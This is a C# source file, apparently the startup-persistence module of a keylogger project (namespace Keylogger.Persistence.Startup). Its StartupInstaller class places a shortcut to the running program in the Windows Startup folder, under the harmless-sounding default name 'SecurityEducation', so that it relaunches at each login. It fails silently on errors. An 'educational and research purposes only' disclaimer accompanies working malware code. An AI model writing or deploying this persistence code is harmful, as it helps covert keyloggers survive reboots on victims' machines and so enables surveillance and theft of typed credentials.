using System;
using System.IO;
using System.Reflection;
using IWshRuntimeLibrary;

namespace Keylogger.Persistence.Startup
{
    /// <summary>
    /// Provides functionality for installing and removing startup persistence
    /// For educational and research purposes only
    /// </summary>
    public class StartupInstaller
    {
        private readonly string _applicationName;
        private readonly string _applicationDescription;

        /// <summary>
        /// Initializes a new instance of the StartupInstaller class
        /// </summary>
        /// <param name="applicationName">The name of the application for the startup shortcut</param>
        /// <param name="applicationDescription">The description for the startup shortcut</param>
        public StartupInstaller(string applicationName, string applicationDescription)
        {
            _applicationName = !string.IsNullOrWhiteSpace(applicationName) 
                ? applicationName 
                : "SecurityEducation";
                
            _applicationDescription = !string.IsNullOrWhiteSpace(applicationDescription) 
                ? applicationDescription 
                : "Security Education Tool";
        }

        /// <summary>
        /// Gets the path to the Windows Startup folder
        /// </summary>
        public string StartupFolderPath => Environment.GetFolderPath(Environment.SpecialFolder.Startup);

        /// <summary>
        /// Gets the path to the shortcut file in the Windows Startup folder
        /// </summary>
        public string StartupShortcutPath => Path.Combine(StartupFolderPath, $"{_applicationName}.lnk");

        /// <summary>
        /// Checks if the persistence mechanism is installed
        /// </summary>
        /// <returns>True if persistence is installed, otherwise false</returns>
        public bool IsPersistenceInstalled()
        {
            return File.Exists(StartupShortcutPath);
        }

        /// <summary>
        /// Installs the application for startup persistence
        /// </summary>
        /// <returns>True if installation was successful, otherwise false</returns>
        public bool InstallForPersistence()
        {
            try
            {
                string appPath = Assembly.GetExecutingAssembly().Location;
                
                // Create a shortcut in the startup folder
                WshShell shell = new WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(StartupShortcutPath);
                shortcut.TargetPath = appPath;
                shortcut.WorkingDirectory = Path.GetDirectoryName(appPath);
                shortcut.Description = _applicationDescription;
                shortcut.Save();
                
                return true;
            }
            catch (Exception)
            {
                // Fail silently for research purposes
                return false;
            }
        }

        /// <summary>
        /// Removes startup persistence
        /// </summary>
        /// <returns>True if removal was successful, otherwise false</returns>
        public bool RemovePersistence()
        {
            try
            {
                if (File.Exists(StartupShortcutPath))
                {
                    File.Delete(StartupShortcutPath);
                    return true;
                }
                
                return false;
            }
            catch (Exception)
            {
                // Fail silently for research purposes
                return false;
            }
        }
    }
}